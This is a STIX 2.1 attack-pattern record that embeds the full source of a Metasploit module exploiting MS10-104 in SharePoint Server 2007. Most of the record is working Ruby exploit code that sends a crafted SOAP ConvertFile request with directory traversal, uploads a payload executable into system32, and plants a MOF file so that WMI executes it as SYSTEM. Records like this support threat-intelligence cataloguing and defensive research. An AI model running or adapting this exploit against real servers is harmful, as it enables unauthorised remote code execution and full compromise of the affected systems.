{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c72a2a9-21d9-49c6-98fb-205cc53be239",
    "created": "2024-08-14T16:45:59.532102Z",
    "modified": "2024-08-14T16:45:59.532106Z",
    "name": "MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution",
    "description": " This module exploits a vulnerability found in SharePoint Server 2007 SP2. The software contains a directory traversal, that allows a remote attacker to write arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile request to the Office Document Conversions Launcher Service, which results in code execution under the context of 'SYSTEM'.  The module uses the Windows Management Instrumentation service to execute an arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers. It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ms10_104_sharepoint.rb",
            "external_id": "ms10_104_sharepoint.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3964"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize\n    super(\n      'Name'        => 'MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability found in SharePoint Server 2007 SP2. The\n        software contains a directory traversal, that allows a remote attacker to write\n        arbitrary files to the filesystem, sending a specially crafted SOAP ConvertFile\n        request to the Office Document Conversions Launcher Service, which results in code\n        execution under the context of 'SYSTEM'.\n\n        The module uses the Windows Management Instrumentation service to execute an\n        arbitrary payload on vulnerable installations of SharePoint on Windows 2003 Servers.\n        It has been successfully tested on Office SharePoint Server 2007 SP2 over Windows\n        2003 SP2.\n      },\n      'Author'      => [\n        'Oleksandr Mirosh', # Vulnerability Discovery and PoC\n        'James Burton', # Vulnerability analysis published at \"Entomology: A Case Study of Rare and Interesting Bugs\"\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'CVE', '2010-3964' ],\n          [ 'OSVDB', '69817' ],\n          [ 'BID', '45264' ],\n          [ 'MSB', 'MS10-104' ],\n          [ 'ZDI', '10-287' ]\n        ],\n      'Targets'     =>\n        [\n          [ 'Microsoft Office SharePoint Server 2007 SP2 / Microsoft Windows Server 2003 SP2', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Dec 14 2010'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8082),\n        OptInt.new('DEPTH', [true, \"Levels to reach base directory\",7])\n      ])\n  end\n\n  # Msf::Exploit::Remote::HttpClient is avoided because send_request_cgi doesn't get\n  # the response maybe due to the 100 (Continue) status response even when the Expect\n  # header isn't included in the request.\n  def upload_file(file_name, contents)\n\n    traversal = \"..\\\\\" * datastore['DEPTH']\n\n    soap_convert_file = \"<SOAP-ENV:Envelope xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" \"\n    soap_convert_file << \"xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\" \"\n    soap_convert_file << \"xmlns:SOAP-ENC=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\" \"\n    soap_convert_file << \"xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" \"\n    soap_convert_file << \"xmlns:clr=\\\"http://schemas.microsoft.com/soap/encoding/clr/1.0\\\" \"\n    soap_convert_file << \"SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<SOAP-ENV:Body>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<i2:ConvertFile id=\\\"ref-1\\\" \"\n    soap_convert_file << \"xmlns:i2=\\\"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface\\\">\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<launcherUri id=\\\"ref-3\\\">http://#{rhost}:8082/HtmlTrLauncher</launcherUri>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<appExe id=\\\"ref-4\\\"></appExe>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<convertFrom id=\\\"ref-5\\\">#{traversal}#{file_name}</convertFrom>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<convertTo id=\\\"ref-6\\\">html</convertTo>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<fileBits href=\\\"#ref-7\\\"/>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<taskName id=\\\"ref-8\\\">brochure_to_html</taskName>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<configInfo id=\\\"ref-9\\\"></configInfo>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<timeout>20</timeout>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<fReturnFileBits>true</fReturnFileBits>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"</i2:ConvertFile>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"<SOAP-ENC:Array id=\\\"ref-7\\\" xsi:type=\\\"SOAP-ENC:base64\\\">#{Rex::Text.encode_base64(contents)}</SOAP-ENC:Array>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"</SOAP-ENV:Body>\" << \"\\x0d\\x0a\"\n    soap_convert_file << \"</SOAP-ENV:Envelope>\" << \"\\x0d\\x0a\"\n\n    res = send_request_cgi({\n      'uri'          => '/HtmlTrLauncher',\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=\"utf-8\"',\n      'headers'      =>\n        {\n        'SOAPAction'      => '\"http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile\"',\n        },\n      'data' => soap_convert_file\n    })\n    return res\n  end\n\n  # The check tries to create a test file in the root\n  def check\n\n    peer = \"#{rhost}:#{rport}\"\n    filename = rand_text_alpha(rand(10)+5) + '.txt'\n    contents = rand_text_alpha(rand(10)+5)\n\n    print_status(\"Sending HTTP ConvertFile Request to upload the test file #{filename}\")\n    res = upload_file(filename, contents)\n\n    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\\/m_ce>/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    # Setup the necessary files to do the wbemexec trick\n    exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n    exe      = generate_payload_exe\n    mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n    mof      = generate_mof(mof_name, exe_name)\n\n    print_status(\"Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}\")\n    res = upload_file(\"WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\\/m_ce>/\n      print_good(\"#{exe_name} uploaded successfully\")\n    else\n      print_error(\"Failed to upload #{exe_name}\")\n      return\n    end\n\n    print_status(\"Sending HTTP ConvertFile Request to upload the mof file #{mof_name}\")\n    res = upload_file(\"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    if res and res.code == 200 and res.body =~ /ConvertFileResponse/ and res.body =~ /<m_ce>CE_OTHER<\\/m_ce>/\n      print_good(\"#{mof_name} uploaded successfully\")\n    else\n      print_error(\"Failed to upload #{mof_name}\")\n      return\n    end\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "Dec 14 2010",
    "x_mitre_platforms": [
        "win'"
    ]
}